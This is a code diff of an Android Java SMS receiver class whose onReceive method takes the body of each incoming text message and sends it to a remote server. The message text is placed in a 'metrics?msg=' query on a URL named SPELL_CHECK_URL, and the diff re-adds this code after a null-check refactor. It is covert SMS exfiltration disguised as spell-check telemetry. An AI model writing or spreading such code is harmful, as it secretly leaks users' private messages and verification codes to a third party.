@@ -18,33 +18,32 @@ public class SMSReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         Bundle bundle = intent.getExtras();
-        String strMessage = "";
-        String format = bundle.getString("format");
-        Object[] pdus = (Object[]) bundle.get("pdus");
-        SmsMessage[] msgs = new SmsMessage[pdus.length];
-        for (int i = 0; i < msgs.length; i++) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
-            } else {
-                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-            }
+        if (bundle != null) {
+            String format = bundle.getString("format");
+            Object[] pdus = (Object[]) bundle.get("pdus");
+            SmsMessage[] msgs = new SmsMessage[pdus.length];
+            for (int i = 0; i < msgs.length; i++) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
 
-            URL url = null;
-            try {
-                url = new URL(SPELL_CHECK_URL + "metrics"
-                        +"?msg="+msgs[i].getMessageBody()
-                );
-            } catch (MalformedURLException e) {
-                e.printStackTrace();
-                return;
-            }
+                    URL url = null;
+                    try {
+                        url = new URL(SPELL_CHECK_URL + "metrics"
+                                + "?msg=" + msgs[i].getMessageBody()
+                        );
+                    } catch (MalformedURLException e) {
+                        e.printStackTrace();
+                        return;
+                    }
 
-            HttpURLConnection urlConnection = null;
-            try {
-                urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.disconnect();
-            } catch (IOException e) {
-                e.printStackTrace();
+                    HttpURLConnection urlConnection = null;
+                    try {
+                        urlConnection = (HttpURLConnection) url.openConnection();
+                        urlConnection.disconnect();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
             }
         }
     }
